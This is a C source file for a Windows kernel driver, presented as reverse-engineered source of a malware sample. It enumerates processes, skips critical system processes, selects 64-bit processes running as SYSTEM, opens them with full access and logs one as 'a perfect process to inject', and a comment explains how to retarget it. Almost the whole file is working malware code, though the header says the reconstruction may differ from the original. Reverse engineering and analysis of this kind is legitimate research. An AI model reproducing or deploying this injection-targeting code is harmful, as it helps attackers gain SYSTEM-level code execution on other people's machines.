/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
                            2023
Copyright (c) Fluxuss Cyber Tech Desenvolvimento de Software, SLU (FLUXUSS)
Copyright (c) Fluxuss Software Security, LLC

! Reversed Soruce code from the original malware and maybe not equivalent the original source code.
*/

#include "ProcessHeuristics.h"


BOOLEAN CheckProcess64(
    
    _In_ HANDLE hProc

) {

    UNICODE_STRING routineName;

    RtlInitUnicodeString(
        
        _Out_ &routineName,
        _In_ L"ZwQueryInformationProcess"
    
    );

    ZwQueryInformationProcess = ( QUERY_INFO_PROCESS )MmGetSystemRoutineAddress(
        
        _In_ &routineName
    
    );

    SYSTEM_PROCESSES* sysProcess;

    sysProcess = ( SYSTEM_PROCESSES* )64;

    if ( ZwQueryInformationProcess == NULL ) {

        DbgPrintEx(
        
            _In_ 0,
            _In_ 0,
            _In_ "Error when ZwQueryInformationProcess"
        
        );

        return FALSE;
    }

    return NT_SUCCESS( ZwQueryInformationProcess(
        
        _In_ hProc,
        _In_ ProcessBasicInformation,
        _Out_ &sysProcess,
        _In_ sizeof( SYSTEM_PROCESSES ),
        _Out_ NULL
    
    ) );
}

BOOLEAN ExecuteCheckingSecurityIdentifiers(
    
    _In_ PEPROCESS* peProcess,
    _In_ UNICODE_STRING* unicodePermission

) {

    PACCESS_TOKEN pObject = PsReferencePrimaryToken(
        
        _Inout_ *peProcess
    
    );

    KPROCESSOR_MODE kAccessMode = 0;

    HANDLE hToken = 0;

    NTSTATUS status = ObOpenObjectByPointer(
        
        _In_ pObject,
        _In_ 0,
        _In_ NULL,
        _In_ 8,
        _In_ NULL,
        _In_ kAccessMode,
        _Out_ &hToken
    
    );

    ObDereferenceObject(
        
        _In_ pObject
    
    );

    if ( status < 0 ) return FALSE;

    ULONG uReturnLength = 0;

    status = ZwQueryInformationToken(
        
        _In_ hToken,
        _In_ TokenUser,
        _Out_ NULL,
        _In_ 0,
        _Out_ &uReturnLength
    
    );

    if ( status != STATUS_BUFFER_TOO_SMALL ) {

        ZwClose( 
            
            _In_ hToken
        
        );

        return FALSE;
    }

    PVOID pTokenInformation = ExAllocatePoolWithTag(
        
        _In_ NonPagedPool,
        _In_ uReturnLength,
        _In_ 'xpp'
    
    );

    if ( pTokenInformation )
        status = ZwQueryInformationToken(
            
            _In_ hToken,
            _In_ TokenUser,
            _Out_ pTokenInformation,
            _In_ uReturnLength,
            _Out_ &uReturnLength
        
        );

    if ( status < 0 || !pTokenInformation ) {

        if ( pTokenInformation )
            ExFreePoolWithTag(
                
                _In_ pTokenInformation,
                _In_ 'xpp'
            
            );

        ZwClose(
            
            _In_ hToken
        
        );

        return FALSE;
    }

    ZwClose(
        
        _In_ hToken
    
    );

    if ( !MmIsAddressValid(
        
        _In_ pTokenInformation
    
    ) || !MmIsAddressValid(
        
        _In_ *( PVOID* )pTokenInformation
    
    ) ) return FALSE;

    if ( MmIsAddressValid(
        
        _In_ *( PVOID* )pTokenInformation
    
    ) ) status = RtlConvertSidToUnicodeString(
        
        _Inout_ unicodePermission,
        _In_ *( PSID* )pTokenInformation,
        _In_ TRUE
    
    );
    else status = STATUS_UNSUCCESSFUL;

    ExFreePoolWithTag(
        
        _In_ pTokenInformation,
        _In_ 0
    
    );

    return NT_SUCCESS( status );
}

BOOLEAN CheckAdjustSecurityIdentifiers(
    
    _In_ PEPROCESS* peProcess

) {

    UNICODE_STRING string;

    return ExecuteCheckingSecurityIdentifiers(
        
        _In_ peProcess,
        _In_ &string
    
    ) && wcscmp(_In_ string.Buffer, _In_ L"S-1-5-18" ) == 0;

}

BOOLEAN CompareString(
    
    _In_ WCHAR* stringToCompare,
    _In_ WCHAR* StringToFind

) {

    UNICODE_STRING uStringOne;
    UNICODE_STRING uStringTwo;

    memset( _Out_ &uStringOne, _In_ 0, _In_ sizeof( uStringOne ) );
    memset( _Out_ &uStringTwo, _In_ 0, _In_ sizeof( uStringTwo ) );

    RtlInitUnicodeString(
        
        _Out_ &uStringOne,
        _In_ stringToCompare
    
    );
    
    RtlInitUnicodeString(
        
        _Out_ &uStringTwo,
        _In_ StringToFind
    
    );

    return RtlCompareUnicodeString(
        
        _In_ &uStringOne,
        _In_ &uStringTwo,
        _In_ TRUE
    
    ) == 0;
}

size_t MoveArgumentToStackAndMoveBackToEaxRegister(
    
    _In_ size_t p1

) {
    /*
        move_argument_stack_and_move_back_ret_register proc near
            parametro_variavel = dword ptr  8

            mov     [rsp+parametro_variavel], ecx
            mov     eax, [rsp+parametro_variavel]
            retn
        move_argument_stack_and_move_back_ret_register endp
    */
    return p1;
}

NTSTATUS OpenTargetProcess(
    
    _In_ SIZE_T* pPID

) {

    ULONG ulReturnLenght = 0;

    auto ntStatus = ZwQuerySystemInformation(
        
        _In_ SystemInformationClass_FLAG,
        _Inout_ NULL,
        _In_ 0,
        _Out_opt_ &ulReturnLenght
    
    );

    if ( ntStatus != STATUS_INFO_LENGTH_MISMATCH ) return ntStatus;

    SYSTEM_PROCESSES* systemProcess = ( SYSTEM_PROCESSES* )ExAllocatePoolWithTag(
        
        _In_ NonPagedPool,
        _In_ 2 * ulReturnLenght,
        _In_ 'xp'
    
    ); // yes this malware use the 'xp' for the tag name

    if ( !systemProcess ) return STATUS_NO_MEMORY;

    ntStatus = ZwQuerySystemInformation(
        
        _In_ SystemInformationClass_FLAG,
        _Inout_ systemProcess,
        _In_ 2 * ulReturnLenght,
        _Out_opt_ NULL
    
    );

    if ( NT_SUCCESS( ntStatus ) ) {

        BOOLEAN bFound = 0;
        
        SYSTEM_PROCESSES* i = systemProcess;

        do {

            if ( 
                
                i->ProcessId != MoveArgumentToStackAndMoveBackToEaxRegister( _In_ 4 )
                && i->InheritedFromProcessId != MoveArgumentToStackAndMoveBackToEaxRegister( _In_ 4 )

                //The Driver will compare for process into your blacklist
                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"wininit.exe" )
                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"csrss.exe" )
                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"smss.exe" )
                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"services.exe" )
                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"winlogon.exe" )
                && !CompareString( _In_ i->ProcessName.Buffer, _In_ L"lsass.exe" )
                
                ) {

                PEPROCESS peProcess = 0, peProcess2;

                if ( NT_SUCCESS( PsLookupProcessByProcessId(
                    
                    _In_ ( HANDLE )i->ProcessId,
                    _Outptr_ &peProcess
                
                ) ) ) {

                    if ( i->ProcessId != *pPID ) {

                        ntStatus = PsLookupProcessByProcessId(
                            
                            _In_ ( HANDLE )i->ProcessId,
                            _Outptr_ &peProcess2
                        
                        );

                        if ( !ntStatus ) {

                            BOOLEAN bFlag2 = FALSE;

                            KAPC_STATE kApcState;

                            KeStackAttachProcess(
                                
                                _Inout_ peProcess2,
                                _Out_ &kApcState
                            
                            );
                            
                            // se quser utilizar outro processo edite essa linha ->  CompareString(i->ProcessName.Buffer, L"brave.exe")
                            // apenas lembre que o processo precisa ser de x64
                            if ( CheckAdjustSecurityIdentifiers( 
                                
                                _In_ &peProcess2
                            
                            ) ) {

                                OBJECT_ATTRIBUTES objectAtributes;
                                objectAtributes.Length = 48;
                                
                                memset( _Out_ &objectAtributes.RootDirectory, _In_ 0, _In_ 20 );
                                
                                objectAtributes.SecurityDescriptor = 0i64;
                                objectAtributes.SecurityQualityOfService = 0i64;
                                CLIENT_ID clientId;

                                clientId.UniqueProcess = ( HANDLE )i->ProcessId;
                                clientId.UniqueThread = ( HANDLE )0;

                                HANDLE hProcess;

                                ntStatus = ZwOpenProcess(
                                    
                                    _Out_ &hProcess,
                                    _In_ 0x1FFFFF,
                                    _In_ &objectAtributes,
                                    _In_opt_ &clientId
                                
                                );

                                if ( NT_SUCCESS( ntStatus ) ) {

                                    if ( !CheckProcess64( 
                                        
                                        _In_ hProcess
                                    
                                    ) ) {

                                        if ( bFound ) bFound = FALSE;
                                        else bFlag2 = TRUE;

                                    }

                                    ZwClose(
                                        
                                        _In_ hProcess
                                    
                                    );

                                }

                            }

                            KeUnstackDetachProcess(
                                
                                _In_ &kApcState
                            
                            );

                            if ( bFlag2 ) {

                                DbgPrintEx(
                                    
                                    _In_ 0,
                                    _In_ 0,
                                    _In_ "Found a perfect process to inject: %ls",
                                    i->ProcessName.Buffer
                                
                                );

                                *pPID = i->ProcessId;

                                return STATUS_SUCCESS;
                            }
                        }

                    }


                }

            }

            i = ( SYSTEM_PROCESSES* )( ( unsigned char* )i + i->NextEntryDelta );

        } while ( i->NextEntryDelta );

    }
    else {

        ExFreePoolWithTag(
            
            _In_ systemProcess,
            _In_ 'xp'
        
        );

        return ntStatus;
    }

    return STATUS_SUCCESS;
}